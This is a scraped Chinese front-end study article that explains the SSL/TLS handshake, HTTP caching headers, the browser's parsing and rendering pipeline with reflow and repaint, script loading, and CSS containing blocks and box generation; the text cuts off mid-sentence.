class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 浏览器请求建立SSL链接，并向服务端发送一个随机数–Client random和客户端支持的加密方法，比如RSA加密，此时是明文传输。 </span><br><span class="line">2. 服务端从中选出一组加密算法与Hash算法，回复一个随机数–Server random，并将自己的身份信息以证书的形式发回给浏览器</span><br><span class="line">（证书里包含了网站地址，非对称加密的公钥，以及证书颁发机构等信息）</span><br><span class="line">3. 浏览器收到服务端的证书后</span><br><span class="line">    </span><br><span class="line">    - 验证证书的合法性（颁发机构是否合法，证书中包含的网址是否和正在访问的一样），如果证书信任，则浏览器会显示一个小锁头，否则会有提示</span><br><span class="line">    </span><br><span class="line">    - 用户接收证书后（不管信不信任），浏览会生产新的随机数–Premaster secret，然后证书中的公钥以及指定的加密方法加密`Premaster secret`，发送给服务器。</span><br><span class="line">    </span><br><span class="line">    - 利用Client random、Server random和Premaster secret通过一定的算法生成HTTP链接数据传输的对称加密key-`session key`</span><br><span class="line">    </span><br><span class="line">    - 使用约定好的HASH算法计算握手消息，并使用生成的`session key`对消息进行加密，最后将之前生成的所有信息发送给服务端。 </span><br><span class="line">    </span><br><span class="line">4. 服务端收到浏览器的回复</span><br><span class="line">    - 利用已知的加解密方式与自己的私钥进行解密，获取`Premaster secret`</span><br><span class="line">    </span><br><span class="line">    - 和浏览器相同规则生成`session key`</span><br><span class="line">    </span><br><span class="line">    - 使用`session key`解密浏览器发来的握手消息，并验证Hash是否与浏览器发来的一致</span><br><span class="line">    </span><br><span class="line">    - 使用`session key`加密一段握手消息，发送给浏览器</span><br><span class="line">    </span><br><span class="line">5. 浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，</span><br></pre></td></tr></table></figure><p><strong>之后所有的https通信数据将由之前浏览器生成的</strong><code>**session key**</code><strong>并利用对称加密算法进行加密</strong><br />这里放一张图（来源：<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">阮一峰-图解SSL&#x2F;TLS协议</a>）<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826666-f955799e-75b6-4359-abf9-1fe56f15e6e8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826666-f955799e-75b6-4359-abf9-1fe56f15e6e8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-12"></a></p><h2 id="单独拎出来的缓存问题，http的缓存"><a href="#单独拎出来的缓存问题，http的缓存" class="headerlink" title="单独拎出来的缓存问题，http的缓存"></a>单独拎出来的缓存问题，http的缓存</h2><p>前后端的http交互中，使用缓存能很大程度上的提升效率，而且基本上对性能有要求的前端项目都是必用缓存的<br><a name="section-12-1"></a></p><h3 id="强缓存与弱缓存"><a href="#强缓存与弱缓存" class="headerlink" title="强缓存与弱缓存"></a>强缓存与弱缓存</h3><p>缓存可以简单的划分成两种类型：<code>强缓存</code>（<code>200 from cache</code>）与<code>协商缓存</code>（<code>304</code>）<br />区别简述如下：</p><ul><li>强缓存（<code>200 from cache</code>）时，浏览器如果判断本地缓存未过期，就直接使用，无需发起http请求</li><li>协商缓存（<code>304</code>）时，浏览器会向服务端发起http请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存</li></ul><p>对于协商缓存，使用<code>Ctrl + F5</code>强制刷新可以使得缓存无效<br />但是对于强缓存，在未过期时，必须更新资源路径才能发起新的请求（更改了路径相当于是另一个资源了，这也是前端工程化中常用到的技巧）<br><a name="section-12-2"></a></p><h3 id="缓存头部简述"><a href="#缓存头部简述" class="headerlink" title="缓存头部简述"></a>缓存头部简述</h3><p>上述提到了强缓存和协商缓存，那它们是怎么区分的呢？<br />答案是通过不同的http头部控制<br />先看下这几个头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-None-Match/E-tag、If-Modified-Since/Last-Modified、Cache-Control/Max-Age、Pragma/Expires</span><br></pre></td></tr></table></figure><p>这些就是缓存中常用到的头部，这里不展开。仅列举下大致使用。<br />属于强缓存控制的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（http1.1）Cache-Control/Max-Age</span><br><span class="line">（http1.0）Pragma/Expires</span><br></pre></td></tr></table></figure><p>注意：<code>**Max-Age**</code><strong>不是一个头部，它是</strong><code>**Cache-Control**</code><strong>头部的值</strong><br />属于协商缓存控制的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（http1.1）If-None-Match/E-tag</span><br><span class="line">（http1.0）If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure><p>可以看到，上述有提到<code>http1.1</code>和<code>http1.0</code>，这些不同的头部是属于不同http时期的<br />再提一点，其实HTML页面中也有一个meta标签可以控制缓存方案-<code>Pragma</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span><br></pre></td></tr></table></figure><p>不过，这种方案还是比较少用到，因为支持情况不佳，譬如缓存代理服务器肯定不支持，所以不推荐<br><a name="section-12-3"></a></p><h3 id="头部的区别"><a href="#头部的区别" class="headerlink" title="头部的区别"></a>头部的区别</h3><p>首先明确，http的发展是从http1.0到http1.1<br />而在http1.1中，出了一些新内容，弥补了http1.0的不足。<br /><strong>http1.0中的缓存控制：</strong></p><ul><li><code>Pragma</code>：严格来说，它不属于专门的缓存控制头部，但是它设置<code>no-cache</code>时可以让本地强缓存失效（属于编译控制，来实现特定的指令，主要是因为兼容http1.0，所以以前又被大量应用）</li><li><code>Expires</code>：服务端配置的，属于强缓存，用来控制在规定的时间之前，浏览器不会发出请求，而是直接使用本地缓存，注意，Expires一般对应服务器端时间，如<code>Expires：Fri, 30 Oct 1998 14:19:41</code></li><li><code>If-Modified-Since/Last-Modified</code>：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是<code>If-Modified-Since</code>，而服务端的是<code>Last-Modified</code>，它的作用是，在发起请求时，如果<code>If-Modified-Since</code>和<code>Last-Modified</code>匹配，那么代表服务器资源并未改变，因此服务端不会返回资源实体，而是只返回头部，通知浏览器可以使用本地缓存。<code>Last-Modified</code>，顾名思义，指的是文件最后的修改时间，而且只能精确到<code>1s</code>以内</li></ul><p><strong>http1.1中的缓存控制：</strong></p><ul><li><code>Cache-Control</code>：缓存控制头部，有no-cache、max-age等多种取值</li><li><code>Max-Age</code>：服务端配置的，用来控制强缓存，在规定的时间之内，浏览器无需发出请求，直接使用本地缓存，注意，Max-Age是Cache-Control头部的值，不是独立的头部，譬如<code>Cache-Control: max-age=3600</code>，而且它值得是绝对时间，由浏览器自己计算</li><li><code>If-None-Match/E-tag</code>：这两个是成对出现的，属于协商缓存的内容，其中浏览器的头部是<code>If-None-Match</code>，而服务端的是<code>E-tag</code>，同样，发出请求后，如果<code>If-None-Match</code>和<code>E-tag</code>匹配，则代表内容未变，通知浏览器使用本地缓存，和Last-Modified不同，E-tag更精确，它是类似于指纹一样的东西，基于<code>FileEtag INode Mtime Size</code>生成，也就是说，只要文件变，指纹就会变，而且没有1s精确度的限制。</li></ul><p><strong>Max-Age相比Expires？</strong><br /><code>Expires</code>使用的是服务器端的时间<br />但是有时候会有这样一种情况-客户端时间和服务端不同步<br />那这样，可能就会出问题了，造成了浏览器本地的缓存无用或者一直无法过期<br />所以一般http1.1后不推荐使用<code>Expires</code><br />而<code>Max-Age</code>使用的是客户端本地时间的计算，因此不会有这个问题<br />因此推荐使用<code>Max-Age</code>。<br />注意，如果同时启用了<code>Cache-Control</code>与<code>Expires</code>，<code>Cache-Control</code>优先级高。<br /><strong>E-tag相比Last-Modified？</strong><br /><code>Last-Modified</code>：</p><ul><li>表明服务端的文件最后何时改变的</li><li>它有一个缺陷就是只能精确到1s，</li><li>然后还有一个问题就是有的服务端的文件会周期性的改变，导致缓存失效</li></ul><p>而<code>E-tag</code>：</p><ul><li>是一种指纹机制，代表文件相关指纹</li><li>只有文件变才会变，也只要文件变就会变，</li><li>也没有精确时间的限制，只要文件一遍，立马E-tag就不一样了</li></ul><p>如果同时带有<code>E-tag</code>和<code>Last-Modified</code>，服务端会优先检查<code>E-tag</code><br />各大缓存头部的整体关系如下图<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826929-1f0b241c-2548-4b7e-abc1-93f42eedc27a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596826929-1f0b241c-2548-4b7e-abc1-93f42eedc27a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13"></a></p><h2 id="解析页面流程"><a href="#解析页面流程" class="headerlink" title="解析页面流程"></a>解析页面流程</h2><p>前面有提到http交互，那么接下来就是浏览器获取到html，然后解析，渲染<br /><strong>这部分很多都参考了网上资源，特别是图片，参考了来源中的文章</strong><br><a name="section-13-1"></a></p><h3 id="流程简述"><a href="#流程简述" class="headerlink" title="流程简述"></a>流程简述</h3><p>浏览器内核拿到内容后，渲染步骤大致可以分为以下几步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 解析HTML，构建DOM树</span><br><span class="line">2. 解析CSS，生成CSS规则树</span><br><span class="line">3. 合并DOM树和CSS规则，生成render树</span><br><span class="line">4. 布局render树（Layout/reflow），负责各元素尺寸、位置的计算</span><br><span class="line">5. 绘制render树（paint），绘制页面像素信息</span><br><span class="line">6. 浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上</span><br></pre></td></tr></table></figure><p>如下图：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829677-38270453-c2a0-469f-8c29-4103c641bec2.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829677-38270453-c2a0-469f-8c29-4103c641bec2.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13-2"></a></p><h3 id="HTML解析，构建DOM"><a href="#HTML解析，构建DOM" class="headerlink" title="HTML解析，构建DOM"></a>HTML解析，构建DOM</h3><p>整个渲染步骤中，HTML解析是第一步。<br />简单的理解，这一步的流程是这样的：<strong>浏览器解析HTML，构建DOM树。</strong><br />但实际上，在分析整体构建时，却不能一笔带过，得稍微展开。<br />解析HTML到构建出DOM当然过程可以简述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → DOM</span><br></pre></td></tr></table></figure><p>譬如假设有这样一个HTML页面：（以下部分的内容出自参考来源，修改了下格式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;title&gt;Critical Path&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;p&gt;Hello &lt;span&gt;web performance&lt;/span&gt; students!&lt;/p&gt;</span><br><span class="line">    &lt;div&gt;&lt;img src=&quot;awesome-photo.jpg&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>浏览器的处理如下：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829219-ed51e09e-6e56-4557-a6b4-fd2362c2b401.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829219-ed51e09e-6e56-4557-a6b4-fd2362c2b401.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />列举其中的一些重点过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Conversion转换：浏览器将获得的HTML内容（Bytes）基于他的编码转换为单个字符</span><br><span class="line">2. Tokenizing分词：浏览器按照HTML规范标准将这些字符转换为不同的标记token。每个token都有自己独特的含义以及规则集</span><br><span class="line">3. Lexing词法分析：分词的结果是得到一堆的token，此时把他们转换为对象，这些对象分别定义他们的属性和规则</span><br><span class="line">4. DOM构建：因为HTML标记定义的就是不同标签之间的关系，这个关系就像是一个树形结构一样</span><br><span class="line">例如：body对象的父节点就是HTML对象，然后段略p对象的父节点就是body对象</span><br></pre></td></tr></table></figure><p>最后的DOM树如下：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596831267-4bc2c7b3-2682-4e30-b451-07de0442957b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596831267-4bc2c7b3-2682-4e30-b451-07de0442957b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13-3"></a></p><h3 id="生成CSS规则"><a href="#生成CSS规则" class="headerlink" title="生成CSS规则"></a>生成CSS规则</h3><p>同理，CSS规则树的生成也是类似。简述为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → CSSOM</span><br></pre></td></tr></table></figure><p>譬如<code>style.css</code>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">body &#123; font-size: 16px &#125;</span><br><span class="line">p &#123; font-weight: bold &#125;</span><br><span class="line">span &#123; color: red &#125;</span><br><span class="line">p span &#123; display: none &#125;</span><br><span class="line">img &#123; float: right &#125;</span><br></pre></td></tr></table></figure><p>那么最终的CSSOM树就是：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596830151-b1681a32-9be9-4ff5-aa0a-89396221a409.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596830151-b1681a32-9be9-4ff5-aa0a-89396221a409.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13-4"></a></p><h3 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h3><p>当DOM树和CSSOM都有了后，就要开始构建渲染树了<br />一般来说，渲染树和DOM树相对应的，但不是严格意义上的一一对应<br />因为有一些不可见的DOM元素不会插入到渲染树中，如head这种不可见的标签或者<code>display: none</code>等<br />整体来说可以看图：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596827869-e6ad6b79-a912-4bbd-ad09-af1cb6b9c96b.png#height=420&id=eOPtP&originHeight=420&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=900" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596827869-e6ad6b79-a912-4bbd-ad09-af1cb6b9c96b.png#height=420&id=eOPtP&originHeight=420&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=900" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13-5"></a></p><h3 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h3><p>有了render树，接下来就是开始渲染，基本流程如下：<br /><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/164572/1588596831489-075f87dd-2cbe-4e92-af49-1bf03b96befa.jpeg" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/jpeg/164572/1588596831489-075f87dd-2cbe-4e92-af49-1bf03b96befa.jpeg" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />图中重要的四个步骤就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 计算CSS样式</span><br><span class="line">2. 构建渲染树</span><br><span class="line">3. 布局，主要定位坐标和大小，是否换行，各种position overflow z-index属性</span><br><span class="line">4. 绘制，将图像绘制出来</span><br></pre></td></tr></table></figure><p>然后，图中的线与箭头代表通过js动态修改了DOM或CSS，导致了重新布局（Layout）或渲染（Repaint）<br />这里Layout和Repaint的概念是有区别的：</p><ul><li>Layout，也称为Reflow，即回流。一般意味着元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树</li><li>Repaint，即重绘。意味着元素发生的改变只是影响了元素的一些外观之类的时候（例如，背景色，边框颜色，文字颜色等），此时只需要应用新样式绘制这个元素就可以了</li></ul><p>回流的成本开销要高于重绘，而且一个节点的回流往往回导致子节点以及同级节点的回流， 所以优化方案中一般都包括，尽量避免回流。<br /><strong>什么会引起回流？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.页面渲染初始化</span><br><span class="line">2.DOM结构改变，比如删除了某个节点</span><br><span class="line">3.render树变化，比如减少了padding</span><br><span class="line">4.窗口resize</span><br><span class="line">5.最复杂的一种：获取某些属性，引发回流，</span><br><span class="line">很多浏览器会对回流做优化，会等到数量足够时做一次批处理回流，</span><br><span class="line">但是除了render树的直接变化，当获取一些属性时，浏览器为了获得正确的值也会触发回流，这样使得浏览器优化无效，包括</span><br><span class="line">    （1）offset(Top/Left/Width/Height)</span><br><span class="line">     (2) scroll(Top/Left/Width/Height)</span><br><span class="line">     (3) cilent(Top/Left/Width/Height)</span><br><span class="line">     (4) width,height</span><br><span class="line">     (5) 调用了getComputedStyle()或者IE的currentStyle</span><br></pre></td></tr></table></figure><p>回流一定伴随着重绘，重绘却可以单独出现<br />所以一般会有一些优化方案，如：</p><ul><li>减少逐项更改样式，最好一次性更改style，或者将样式定义为class并一次性更新</li><li>避免循环操作dom，创建一个documentFragment或div，在它上面应用所有DOM操作，最后再把它添加到window.document</li><li>避免多次读取offset等属性。无法避免则将它们缓存到变量</li><li>将复杂的元素绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高</li></ul><p><strong>注意：改变字体大小会引发回流</strong><br />再来看一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var s = document.body.style;</span><br><span class="line">s.padding = &quot;2px&quot;; // 回流+重绘</span><br><span class="line">s.border = &quot;1px solid red&quot;; // 再一次 回流+重绘</span><br><span class="line">s.color = &quot;blue&quot;; // 再一次重绘</span><br><span class="line">s.backgroundColor = &quot;#ccc&quot;; // 再一次 重绘</span><br><span class="line">s.fontSize = &quot;14px&quot;; // 再一次 回流+重绘</span><br><span class="line">// 添加node，再一次 回流+重绘</span><br><span class="line">document.body.appendChild(document.createTextNode(&#x27;abc!&#x27;));</span><br></pre></td></tr></table></figure><p><a name="section-13-6"></a></p><h3 id="简单层与复合层"><a href="#简单层与复合层" class="headerlink" title="简单层与复合层"></a>简单层与复合层</h3><p>上述中的渲染中止步于绘制，但实际上绘制这一步也没有这么简单，它可以结合复合层和简单层的概念来讲。<br />这里不展开，进简单介绍下：</p><ul><li>可以认为默认只有一个复合图层，所有的DOM节点都是在这个复合图层下的</li><li>如果开启了硬件加速功能，可以将某个节点变成复合图层</li><li>复合图层之间的绘制互不干扰，由GPU直接控制</li><li>而简单图层中，就算是absolute等布局，变化时不影响整体的回流，但是由于在同一个图层中，仍然是会影响绘制的，因此做动画时性能仍然很低。而复合层是独立的，所以一般做动画推荐使用硬件加速</li></ul><p>更多参考：<br /><a href="https://segmentfault.com/a/1190000012925872#articleHeader16">普通图层和复合图层</a><br><a name="section-13-7"></a></p><h3 id="Chrome中的调试"><a href="#Chrome中的调试" class="headerlink" title="Chrome中的调试"></a>Chrome中的调试</h3><p>Chrome的开发者工具中，Performance中可以看到详细的渲染过程：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829910-21624730-fe55-4792-93f0-d3ad6b197c63.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588596829910-21624730-fe55-4792-93f0-d3ad6b197c63.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="section-13-8"></a></p><h3 id="资源外链的下载"><a href="#资源外链的下载" class="headerlink" title="资源外链的下载"></a>资源外链的下载</h3><p>上面介绍了html解析，渲染流程。但实际上，在解析html时，会遇到一些资源连接，此时就需要进行单独处理了<br />简单起见，这里将遇到的静态资源分为一下几大类（未列举所有）：</p><ul><li>CSS样式资源</li><li>JS脚本资源</li><li>img图片类资源</li></ul><p><strong>遇到外链时的处理</strong><br />当遇到上述的外链时，会单独开启一个下载线程去下载资源（http1.1中是每一个资源的下载都要开启一个http请求，对应一个tcp&#x2F;ip链接）<br /><strong>遇到CSS样式资源</strong><br />CSS资源的处理有几个特点：</p><ul><li>CSS下载时异步，不会阻塞浏览器构建DOM树</li><li>但是会阻塞渲染，也就是在构建render时，会等到css下载解析完毕后才进行（这点与浏览器优化有关，防止css规则不断改变，避免了重复的构建）</li><li>有例外，<code>media query</code>声明的CSS是不会阻塞渲染的</li></ul><p><strong>遇到JS脚本资源</strong><br />JS脚本资源的处理有几个特点：</p><ul><li>阻塞浏览器的解析，也就是说发现一个外链脚本时，需等待脚本下载完成并执行后才会继续解析HTML</li><li>浏览器的优化，一般现代浏览器有优化，在脚本阻塞时，也会继续下载其它资源（当然有并发上限），但是虽然脚本可以并行下载，解析过程仍然是阻塞的，也就是说必须这个脚本执行完毕后才会接下来的解析，并行下载只是一种优化而已</li><li>defer与async，普通的脚本是会阻塞浏览器解析的，但是可以加上defer或async属性，这样脚本就变成异步了，可以等到解析完毕后再执行</li></ul><p>注意，defer和async是有区别的： <strong>defer是延迟执行，而async是异步执行。</strong><br />简单的说（不展开）：</p><ul><li><code>async</code>是异步执行，异步下载完毕后就会执行，不确保执行顺序，一定在<code>onload</code>前，但不确定在<code>DOMContentLoaded</code>事件的前或后</li><li><code>defer</code>是延迟执行，在浏览器看起来的效果像是将脚本放在了<code>body</code>后面一样（虽然按规范应该是在<code>DOMContentLoaded</code>事件前，但实际上不同浏览器的优化效果不一样，也有可能在它后面）</li></ul><p><strong>遇到img图片类资源</strong><br />遇到图片等资源时，直接就是异步下载，不会阻塞解析，下载完毕后直接用图片替换原有src的地方<br><a name="section-13-9"></a></p><h3 id="loaded和domcontentloaded"><a href="#loaded和domcontentloaded" class="headerlink" title="loaded和domcontentloaded"></a>loaded和domcontentloaded</h3><p>简单的对比：</p><ul><li>DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片(譬如如果有async加载的脚本就不一定完成)</li><li>load 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了<br><a name="section-14"></a></li></ul><h2 id="CSS的可视化格式模型"><a href="#CSS的可视化格式模型" class="headerlink" title="CSS的可视化格式模型"></a>CSS的可视化格式模型</h2><p><strong>这一部分内容很多参考《精通CSS-高级Web标准解决方案》以及参考来源</strong><br />前面提到了整体的渲染概念，但实际上文档树中的元素是按什么渲染规则渲染的，是可以进一步展开的，此部分内容即： <strong>CSS的可视化格式模型</strong><br />先了解：</p><ul><li>CSS中规定每一个元素都有自己的盒子模型（相当于规定了这个元素如何显示）</li><li>然后可视化格式模型则是把这些盒子按照规则摆放到页面上，也就是如何布局</li><li>换句话说，盒子模型规定了怎么在页面里摆放盒子，盒子的相互作用等等</li></ul><p>说到底： <strong>CSS的可视化格式模型就是规定了浏览器在页面中如何处理文档树</strong><br />关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">包含块（Containing Block）</span><br><span class="line">控制框（Controlling Box）</span><br><span class="line">BFC（Block Formatting Context）</span><br><span class="line">IFC（Inline Formatting Context）</span><br><span class="line">定位体系</span><br><span class="line">浮动</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>另外，CSS有三种定位机制：<code>普通流</code>，<code>浮动</code>，<code>绝对定位</code>，如无特别提及，下文中都是针对普通流中的<br><a name="section-14-1"></a></p><h3 id="包含块（Containing-Block）"><a href="#包含块（Containing-Block）" class="headerlink" title="包含块（Containing Block）"></a>包含块（Containing Block）</h3><p>一个元素的box的定位和尺寸，会与某一矩形框有关，这个框就称之为包含块。<br />元素会为它的子孙元素创建包含块，但是，并不是说元素的包含块就是它的父元素，元素的包含块与它的祖先元素的样式等有关系<br />譬如：</p><ul><li>根元素是最顶端的元素，它没有父节点，它的包含块就是初始包含块</li><li>static和relative的包含块由它最近的块级、单元格或者行内块祖先元素的内容框（content）创建</li><li>fixed的包含块是当前可视窗口</li><li>absolute的包含块由它最近的position 属性为<code>absolute</code>、<code>relative</code>或者<code>fixed</code>的祖先元素创建<ul><li>如果其祖先元素是行内元素，则包含块取决于其祖先元素的<code>direction</code>特性</li><li>如果祖先元素不是行内元素，那么包含块的区域应该是祖先元素的内边距边界<br><a name="section-14-2"></a></li></ul></li></ul><h3 id="控制框（Controlling-Box）"><a href="#控制框（Controlling-Box）" class="headerlink" title="控制框（Controlling Box）"></a>控制框（Controlling Box）</h3><p>块级元素和块框以及行内元素和行框的相关概念<br /><strong>块框:</strong></p><ul><li>块级元素会生成一个块框（<code>Block Box</code>），块框会占据一整行，用来包含子box和生成的内容</li><li>块框同时也是一个块包含框（<code>Containing Box</code>），里面要么只包含块框，要么只包含行内框（不能混杂），如果块框内部有块级元素也有行内元素，那么行内元素会被匿名块框包围</li></ul><p>关于<strong>匿名块框</strong>的生成，示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV&gt;</span><br><span class="line">Some text</span><br><span class="line">&lt;P&gt;More text</span><br><span class="line">&lt;/DIV&gt;</span><br></pre></td></tr></table></figure><p><code>div</code>生成了一个块框，包含了另一个块框<code>p</code>以及文本内容<code>Some text</code>，此时<code>Some text</code>文本会被强制加到一个匿名的块框里面，被<code>div</code>生成的块框包含（其实这个就是<code>IFC</code>中提到的行框，包含这些行内框的这一行匿名块形成的框，行框和行内框不同）<br />换句话说:<br /><strong>如果一个块框在其中包含另外一个块框，那么我们强迫它只能包含块框，因此其它文本内容生成出来的都是匿名块框（而不是匿名行内框）</strong><br /><strong>行内框：</strong></p><ul><li>一个行内元素生成一个行内框</li><li>行内元素能排在一行，允许左右有其它元素</li></ul><p>关于<strong>匿名行内框</strong>的生成，示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;P&gt;Some &lt;EM&gt;emphasized&lt;/EM&gt; text&lt;/P&gt;</span><br></pre></td></tr></table></figure><p><code>P</code>元素生成一个块框，其中有几个行内框（如<code>EM</code>），以及文本<code>Some</code>，<code>text</code>，此时会专门为这些文本生成匿名行内框<br /><strong>display属性的影响</strong><br /><code>display</code>的几个属性也可以影响不同框的生成：</p><ul><li><code>block</code>，元素生成一个块框</li><li><code>inline</code>，元素产生一个或多个的行内框</li><li><code>inline-block</code>，元素产生一个行内级块框，行内块框的内部会被当作块块来格式化，而此元素本身会被当作行内级框来格式化（这也是为什么会产生<code>BFC</code>）</li><li><code>none</code>，不生成框，不再格式化结构中，当然了，另一个<code>visibility: 